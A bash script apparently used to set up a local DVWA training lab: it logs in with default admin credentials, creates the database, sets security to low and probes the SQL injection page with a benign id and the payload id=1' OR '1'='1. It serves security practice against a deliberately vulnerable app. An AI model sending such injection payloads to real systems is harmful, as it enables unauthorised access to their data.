#!/bin/bash

echo "Initializing DVWA database..."

# Visit login page first to get initial cookie
COOKIE=$(curl -s -c - http://localhost:8080/login.php | grep PHPSESSID | awk '{print $7}')
echo "Initial cookie: $COOKIE"

# Login
LOGIN_RESPONSE=$(curl -s -c - -b "PHPSESSID=$COOKIE" \
    -d "username=admin&password=password&Login=Login" \
    -L http://localhost:8080/login.php | grep PHPSESSID | awk '{print $7}')

if [ ! -z "$LOGIN_RESPONSE" ]; then
    COOKIE=$LOGIN_RESPONSE
fi
echo "After login: $COOKIE"

# Create database by visiting setup.php and clicking create button
echo "Creating database..."
curl -s -b "PHPSESSID=$COOKIE" \
    -X POST \
    -d "create_db=Create" \
    -L http://localhost:8080/setup.php > /tmp/setup_response.html

grep -i "database\|created\|error\|success" /tmp/setup_response.html | head -5

# Get new session after database creation
COOKIE=$(curl -s -c - -d "username=admin&password=password&Login=Login" http://localhost:8080/login.php | grep PHPSESSID | awk '{print $7}')
echo "New session: $COOKIE"

# Set security to low
curl -s -b "PHPSESSID=$COOKIE" -d 'security=low&seclev_submit=Submit' http://localhost:8080/security.php > /dev/null
echo "Security set to low"

echo ""
echo "Testing SQLi with id=1:"
curl -s -b "PHPSESSID=$COOKIE; security=low" "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" | grep -A 1 "First name:" | head -5

echo ""
echo "Testing SQLi with id=1' OR '1'='1:"
curl -s -b "PHPSESSID=$COOKIE; security=low" "http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit" | grep -A 1 "First name:" | head -10
